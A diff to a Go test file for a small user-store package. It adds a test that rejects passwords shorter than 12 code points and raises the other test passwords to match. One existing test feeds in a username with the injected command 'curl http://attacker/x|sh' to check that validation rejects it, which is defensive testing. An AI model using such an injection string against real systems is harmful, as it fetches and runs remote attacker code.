@@ -1,19 +1,22 @@
 package tinyauthusers
 
 import (
+	"errors"
 	"os"
 	"os/exec"
 	"strings"
 	"testing"
+
+	"router/internal/authgate"
 )
 
 func TestAddUserRejectsUnsafeName(t *testing.T) {
 	path := t.TempDir() + "/users.json"
-	err := AddUser(path, "x$(curl http://attacker/x|sh)y", "password123")
+	err := AddUser(path, "x$(curl http://attacker/x|sh)y", "password1234")
 	if err == nil {
 		t.Fatalf("AddUser(malicious name) = nil error, want a validation error")
 	}
-	if err := AddUser(path, "normal-user_1@example.com", "password123"); err != nil {
+	if err := AddUser(path, "normal-user_1@example.com", "password1234"); err != nil {
 		t.Fatalf("AddUser(normal name) = %v, want success", err)
 	}
 }
@@ -54,7 +57,7 @@ func TestRenderEnvFileSurvivesShellSourcing(t *testing.T) {
 func TestStoreRoundTripKeepsPasswordHash(t *testing.T) {
 	dir := t.TempDir()
 	storePath := dir + "/users.json"
-	if err := AddUser(storePath, "alice", "password123"); err != nil {
+	if err := AddUser(storePath, "alice", "password1234"); err != nil {
 		t.Fatalf("AddUser() = %v", err)
 	}
 
@@ -113,5 +116,33 @@ func TestRenderEnvFileSkipsHashlessUser(t *testing.T) {
 	want := "TINYAUTH_AUTH_USERS='alice:" + users[1].PasswordHash + "'\n"
 	if string(data) != want {
 		t.Fatalf("rendered %q, want %q", data, want)
+	}
+}
+
+func TestAddUserAndSetPasswordRefuseShortPasswords(t *testing.T) {
+	path := t.TempDir() + "/users.json"
+	short, long := strings.Repeat("a", 11), strings.Repeat("a", 12)
+
+	if err := AddUser(path, "alice", short); !errors.Is(err, authgate.ErrPasswordTooShort) {
+		t.Fatalf("AddUser(11) = %v, want ErrPasswordTooShort", err)
+	}
+	if users, _ := ListUsers(path); len(users) != 0 {
+		t.Fatalf("a refused AddUser still stored a user: %v", users)
+	}
+	if err := AddUser(path, "alice", long); err != nil {
+		t.Fatalf("AddUser(12) = %v", err)
+	}
+	before, _ := ListUsers(path)
+
+	// 11 code points, 33 bytes.
+	if err := SetPassword(path, "alice", strings.Repeat("가", 11)); !errors.Is(err, authgate.ErrPasswordTooShort) {
+		t.Fatalf("SetPassword(11 multibyte) = %v, want ErrPasswordTooShort", err)
+	}
+	after, _ := ListUsers(path)
+	if before[0].PasswordHash != after[0].PasswordHash {
+		t.Fatalf("a refused SetPassword changed the stored hash")
+	}
+	if err := SetPassword(path, "alice", strings.Repeat("가", 12)); err != nil {
+		t.Fatalf("SetPassword(12 multibyte) = %v", err)
 	}
 }
